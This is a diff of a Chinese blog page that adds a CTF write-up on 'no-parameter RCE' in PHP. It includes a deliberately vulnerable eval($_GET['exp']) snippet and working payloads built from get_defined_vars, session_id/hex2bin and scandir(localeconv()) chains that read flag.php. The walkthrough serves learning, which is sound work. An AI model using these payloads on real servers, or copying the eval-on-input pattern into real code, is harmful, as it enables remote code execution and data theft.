@@ -52,8 +52,18 @@
 <meta property="og:image" content="http://example.com/img/tw8.png">
 <meta property="og:image" content="http://example.com/img/tw9.png">
 <meta property="og:image" content="http://example.com/img/tw10.png">
+<meta property="og:image" content="http://example.com/img/tw11.png">
+<meta property="og:image" content="http://example.com/img/tw12.png">
+<meta property="og:image" content="http://example.com/img/tw13.png">
+<meta property="og:image" content="http://example.com/img/tw14.png">
+<meta property="og:image" content="http://example.com/img/tw17.png">
+<meta property="og:image" content="http://example.com/img/tw15.png">
+<meta property="og:image" content="http://example.com/img/tw16.png">
+<meta property="og:image" content="http://example.com/img/tw18.png">
+<meta property="og:image" content="http://example.com/img/tw19.png">
+<meta property="og:image" content="http://example.com/img/tw20.png">
 <meta property="article:published_time" content="2023-09-17T12:08:50.000Z">
-<meta property="article:modified_time" content="2023-10-04T12:33:26.389Z">
+<meta property="article:modified_time" content="2023-10-04T14:07:32.125Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="the quieter you become,the more you can hear">
 <meta name="twitter:card" content="summary_large_image">
@@ -226,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          12k 字
+          15k 字
         
       </span>
     
@@ -237,7 +247,7 @@
         
         
         
-          104 分钟
+          123 分钟
         
       </span>
     
@@ -392,7 +402,7 @@
 
 
 
-<p>经过这种正则匹配后能过滤的基本都过滤了，去网上查了wp原来这是一种叫<code>无参数RCE</code>的题型(第一次见)。</p>
+<p>经过这种正则匹配后能过滤的基本都过滤了，去网上查了wp原来这是一种叫<code>无参数RCE</code>的题型(第一次见)。下面的内容参考了这两位师傅的文章，感谢!</p>
 <p><code>https://blog.csdn.net/Manuffer/article/details/120738755</code></p>
 <p><code>https://blog.csdn.net/weixin_46330722</code></p>
 <p>无参数RCE一般有三种解法：</p>
@@ -427,6 +437,59 @@
 <p><img src="/img/tw9.png" srcset="/img/loading.gif" lazyload alt="tw9"></p>
 <p><img src="/img/tw10.png" srcset="/img/loading.gif" lazyload alt="tw10"></p>
 <p>传两个参数也可以↑</p>
+<p>假如我们要传入的恶意代码放在GET后面(传的第一个参数为了绕过一些特定参数的检测，第二个参数放恶意代码)，那么如何通过<code>current(get_defined_vars())</code>把他取出来？</p>
+<p>可以利用<code>end</code>函数(返回数组最后一个单元的值)，比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/tw11.png" srcset="/img/loading.gif" lazyload alt="tw11"></p>
+<p>绕了个小小的圈子，现在写个简单的东西看看为啥要通过第二种方法传两个参数达到<code>RCE</code>的效果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123; <br> 		     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>	<br><br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>构造payload:<code>?exp=eval(end(current(get_defined_vars())));&amp;c=system(phpinfo());</code></p>
+<p><img src="/img/tw12.png" srcset="/img/loading.gif" lazyload alt="tw12"></p>
+<p>可以看到成功执行了<code>system(phpinfo())</code>。解释下为什么这么写：<code>eval(end(current(get_defined_vars())));</code>这东西为了返回我们get传过去的最后一个参数的值。我一开始没加eval想着外面已经有个eval了(当时人晕了，哈哈)，里面这个eval是为了执行这些套娃函数把恶意代码翻出来，外面的eval是执行恶意代码用的，一来一回就相当于<code>eval(system(phpinfo()))</code>了。而且这第二个参数可以随便构造，反正它只检测<code>exp</code>。</p>
+<p>第三种方法通过<code>session_id</code>执行恶意代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//作用是获取当前会话的ID,也就是cookie中的phpsession，这里要注意的一点是，phpsession中只允许出现 a-z A-Z 0-9 , - 等字符，所以不能直接插入恶意代码，可以先将其16进制编码后再插入。</span><br>测试代码：<br><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//参考了novic4师傅的文章</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = implode(getallheaders());<br><span class="hljs-regexp">//</span>ech<br><span class="hljs-regexp">//</span>var_dump(localeconv());<br><span class="hljs-regexp">//</span>var_dump(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-regexp">//</span><span class="hljs-variable">$viper</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viper&#x27;</span>];<br><span class="hljs-regexp">//</span>@eval(<span class="hljs-variable">$viper</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/tw13.png" srcset="/img/loading.gif" lazyload alt="tw13"></p>
+<p>注意这个hex2bin，他是字符串转字符串而不是数字转数字。</p>
+<p>现在思路就比较清晰了：<code>phpsession</code>头的值我们可以控制，先通过<code>eval(hex2bin(session_id(session_start())));</code>把我们需要的恶意代码翻出来，然后把它传给exp参数就行了(注意要把恶意代码转成十六进制！)：</p>
+<p><code>因为我到现在还没整明白怎么用burpsuite抓本地包，所以下面的图参考了novic4师傅的图，再次感谢！</code></p>
+<p><img src="/img/tw14.png" srcset="/img/loading.gif" lazyload alt="tw14"></p>
+<p>现在回到这个套娃题，已知过滤了<code>et</code>，<code>hex</code>等，似乎上面三种方法都用不了了。。。</p>
+<p>看了师傅们的wp，第一个payload这么写：</p>
+<p><code>?exp=print_r(scandir(current(localeconv())));</code></p>
+<p>先看看这个<code>localeconv()</code>返回了什么东西：</p>
+<p><img src="/img/tw17.png" srcset="/img/loading.gif" lazyload alt="tw17"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/tw15.png" srcset="/img/loading.gif" lazyload alt="tw15"></p>
+<p>第一项返回了我们想要的<code>.</code>。再利用<code>current</code>返回一维数组第一项的值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/tw16.png" srcset="/img/loading.gif" lazyload alt="tw16"></p>
+<p>注意这里和前面那个<code>get_defined_vars</code>区分开，人家返回的是多维数组，现在我们只返回了一个数组，所以<code>current</code>后只有一个点。</p>
+<p><code>scandir(&#39;.&#39;)</code>这东西会以数组形式返回当前目录下的文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/tw18.png" srcset="/img/loading.gif" lazyload alt="tw18"></p>
+<p>综上，我们先通过<code>/?exp=var_dump(scandir(current(localeconv())));</code>看看当前目录下的文件都有啥(var_dump也能用<code>print_r</code>等代替：</p>
+<p><img src="/img/tw19.png" srcset="/img/loading.gif" lazyload alt="tw19"></p>
+<p>可以看到倒数第二个文件就是flag.php了，构造payload:</p>
+<p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p>
+<p>因为<code>flag.php</code>在倒数第二个，所以先<code>array_reverse</code>把它转成正数第二个，然后<code>next</code>直接提取第二个。</p>
+<p><img src="/img/tw20.png" srcset="/img/loading.gif" lazyload alt="tw20"></p>
+<p>也可以用<code>highlight_file()</code>函数替换，他俩差不多。</p>
+<p>还有一种情况，比如这个flag.php的位置不特殊：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">如果flag.php的位置不特殊，可以使用<span class="hljs-title function_ invoke__">array_rand</span>()和<span class="hljs-title function_ invoke__">array_flip</span>()(<span class="hljs-title function_ invoke__">array_rand</span>()返回的是键名所以必须搭配<span class="hljs-title function_ invoke__">array_flip</span>()来交换键名、键值来获得键值，函数作用上面有写到)来随机刷新显示的内容，刷几次就出来了，所以这种情况payload：<br> ?exp=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>第二种方法使用session_id：</p>
 <p>以上内容参考了这些师傅们的文章，感谢！：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sculptor-liu.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/20/</span>GXYCTF-<span class="hljs-number">2019</span>-%E7%A6%<span class="hljs-number">81</span>%E6%AD%A2%E5%A5%<span class="hljs-number">97</span>%E5%A8%<span class="hljs-number">83</span>/<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LLeaves/</span>p/<span class="hljs-number">12868440</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_62879498/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124538469</span><br></code></pre></td></tr></table></figure>
 
@@ -506,8 +569,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/" title="PHP中的弱相等和强相等">
-                        <span class="hidden-mobile">PHP中的弱相等和强相等</span>
+                      <a href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="RCE中一些常见的绕过方法">
+                        <span class="hidden-mobile">RCE中一些常见的绕过方法</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
